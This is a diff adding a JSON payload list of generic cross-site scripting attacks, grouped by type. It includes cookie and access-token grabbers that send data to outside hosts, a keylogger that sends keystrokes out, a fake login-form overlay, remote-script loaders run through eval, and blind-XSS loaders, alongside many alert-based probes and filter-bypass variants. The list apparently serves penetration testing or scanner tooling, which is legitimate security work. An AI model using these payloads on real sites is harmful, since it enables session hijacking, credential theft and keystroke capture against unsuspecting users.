@@ -1,0 +1,221 @@
+{
+  "category": "Generic XSS",
+  "keyword": "generic",
+  "payloads": [
+    {
+      "type": "Data Grabber",
+      "tech": ["generic"],
+      "payload": "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>"
+    },
+    {
+      "type": "Data Grabber",
+      "tech": ["generic"],
+      "payload": "<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>"
+    },
+    {
+      "type": "Data Grabber",
+      "tech": ["generic"],
+      "payload": "<script>new Image().src=\"http://localhost/cookie.php?c=\"+document.cookie;</script>"
+    },
+    {
+      "type": "Data Grabber",
+      "tech": ["generic"],
+      "payload": "<script>new Image().src=\"http://localhost/cookie.php?c=\"+localStorage.getItem('access_token');</script>"
+    },
+    {
+      "type": "CORS",
+      "tech": ["generic"],
+      "payload": "<script>\n  fetch('https://<SESSION>.burpcollaborator.net', {\n  method: 'POST',\n  mode: 'no-cors',\n  body: document.cookie\n  });\n</script>"
+    },
+    {
+      "type": "UI Redressing",
+      "tech": ["generic"],
+      "payload": "<script>\nhistory.replaceState(null, null, '../../../login');\ndocument.body.innerHTML = \"</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>\"\n</script>"
+    },
+    {
+      "type": "Javascript Keylogger",
+      "tech": ["generic"],
+      "payload": "<img src=x onerror='document.onkeypress=function(e){fetch(\"http://domain.com?k=\"+String.fromCharCode(e.which))},this.remove();'>"
+    },
+    {
+      "type": "Identify an XSS Endpoint",
+      "tech": ["generic"],
+      "payload": "<script>debugger;</script>"
+    },
+    {
+      "type": "Identify an XSS Endpoint",
+      "tech": ["generic"],
+      "payload": "<script>alert(document.domain.concat(\"\\n\").concat(window.origin))</script>"
+    },
+    {
+      "type": "Identify an XSS Endpoint",
+      "tech": ["generic"],
+      "payload": "<script>console.log(\"Test XSS from the search bar of page XYZ\\n\".concat(document.domain).concat(\"\\n\").concat(window.origin))</script>"
+    },
+    {
+      "type": "Common Payloads - Basic",
+      "tech": ["generic"],
+      "payload": "<script>alert('XSS')</script>"
+    },
+    {
+      "type": "Common Payloads - Basic",
+      "tech": ["generic"],
+      "payload": "<scr<script>ipt>alert('XSS')</scr<script>ipt>"
+    },
+    {
+      "type": "Common Payloads - Basic",
+      "tech": ["generic"],
+      "payload": "\"><script>alert('XSS')</script>"
+    },
+    {
+      "type": "Common Payloads - Basic",
+      "tech": ["generic"],
+      "payload": "\"><script>alert(String.fromCharCode(88,83,83))</script>"
+    },
+    {
+      "type": "Common Payloads - Img",
+      "tech": ["generic"],
+      "payload": "<img src=x onerror=alert('XSS');>"
+    },
+    {
+      "type": "Common Payloads - Img",
+      "tech": ["generic"],
+      "payload": "<img src=x onerror=alert('XSS')//"
+    },
+    {
+      "type": "Common Payloads - Img",
+      "tech": ["generic"],
+      "payload": "<img src=x onerror=alert(String.fromCharCode(88,83,83));>"
+    },
+    {
+      "type": "Common Payloads - Svg",
+      "tech": ["generic"],
+      "payload": "<svg\u000conload=alert(1)>"
+    },
+    {
+      "type": "Common Payloads - Svg",
+      "tech": ["generic"],
+      "payload": "<svg/onload=alert('XSS')>"
+    },
+    {
+      "type": "Common Payloads - Div",
+      "tech": ["generic"],
+      "payload": "<div onpointerover=\"alert(45)\">MOVE HERE</div>"
+    },
+    {
+      "type": "XSS using HTML5 tags",
+      "tech": ["generic"],
+      "payload": "<body onload=alert(/XSS/.source)>"
+    },
+    {
+      "type": "XSS using HTML5 tags",
+      "tech": ["generic"],
+      "payload": "<input autofocus onfocus=alert(1)>"
+    },
+    {
+      "type": "XSS using HTML5 tags",
+      "tech": ["generic"],
+      "payload": "<video/poster/onerror=alert(1)>"
+    },
+    {
+      "type": "XSS using a remote JS",
+      "tech": ["generic"],
+      "payload": "<svg/onload='fetch(\"//host/a\").then(r=>r.text().then(t=>eval(t)))'>"
+    },
+    {
+      "type": "XSS in Hidden Input",
+      "tech": ["generic"],
+      "payload": "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">"
+    },
+    {
+      "type": "XSS in Uppercase Output",
+      "tech": ["generic"],
+      "payload": "<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>"
+    },
+    {
+      "type": "DOM Based XSS",
+      "tech": ["generic"],
+      "payload": "#\"><img src=/ onerror=alert(2)>"
+    },
+    {
+      "type": "XSS in JS Context",
+      "tech": ["generic"],
+      "payload": "-(confirm)(document.domain)//"
+    },
+    {
+      "type": "Wrapper javascript",
+      "tech": ["generic"],
+      "payload": "javascript:prompt(1)"
+    },
+    {
+      "type": "Wrapper javascript",
+      "tech": ["generic"],
+      "payload": "javascript://%0Aalert(1)"
+    },
+    {
+      "type": "Wrapper data",
+      "tech": ["generic"],
+      "payload": "data:text/html,<script>alert(0)</script>"
+    },
+    {
+      "type": "Wrapper data",
+      "tech": ["generic"],
+      "payload": "<script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"></script>"
+    },
+    {
+      "type": "Wrapper vbscript",
+      "tech": ["generic"],
+      "payload": "vbscript:msgbox(\"XSS\")"
+    },
+    {
+      "type": "XSS in XML",
+      "tech": ["generic"],
+      "payload": "<html>\n<head></head>\n<body>\n<something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script>\n</body>\n</html>"
+    },
+    {
+      "type": "XSS in SVG",
+      "tech": ["generic"],
+      "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>"
+    },
+    {
+      "type": "XSS in Markdown",
+      "tech": ["generic"],
+      "payload": "[a](javascript:prompt(document.cookie))"
+    },
+    {
+      "type": "XSS in CSS",
+      "tech": ["generic"],
+      "payload": "<!DOCTYPE html>\n<html>\n<head>\n<style>\ndiv  {\n    background-image: url(\"data:image/jpg;base64,<\\/style><svg/onload=alert(document.domain)>\");\n    background-color: #cccccc;\n}\n</style>\n</head>\n  <body>\n    <div>lol</div>\n  </body>\n</html>"
+    },
+    {
+      "type": "XSS in PostMessage",
+      "tech": ["generic"],
+      "payload": "<html>\n<body>\n    <input type=button value=\"Click Me\" id=\"btn\">\n</body>\n\n<script>\ndocument.getElementById('btn').onclick = function(e){\n    window.poc = window.open('http://www.redacted.com/#login');\n    setTimeout(function(){\n        window.poc.postMessage(\n            {\n                \"sender\": \"accounts\",\n                \"url\": \"javascript:confirm('XSS')\",\n            },\n            '*'\n        );\n    }, 2000);\n}\n</script>\n</html>"
+    },
+    {
+      "type": "Blind XSS",
+      "tech": ["generic"],
+      "payload": "\"><script src=\"https://js.rip/<custom.name>\"></script>"
+    },
+    {
+      "type": "Blind XSS",
+      "tech": ["generic"],
+      "payload": "\"><script src=//<custom.subdomain>.xss.ht></script>"
+    },
+    {
+      "type": "Blind XSS",
+      "tech": ["generic"],
+      "payload": "<script>$.getScript(\"//<custom.subdomain>.xss.ht\")</script>"
+    },
+    {
+      "type": "Blind XSS Tips",
+      "tech": ["generic"],
+      "payload": "<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>"
+    },
+    {
+      "type": "Mutated XSS",
+      "tech": ["generic"],
+      "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+    }
+  ]
+}
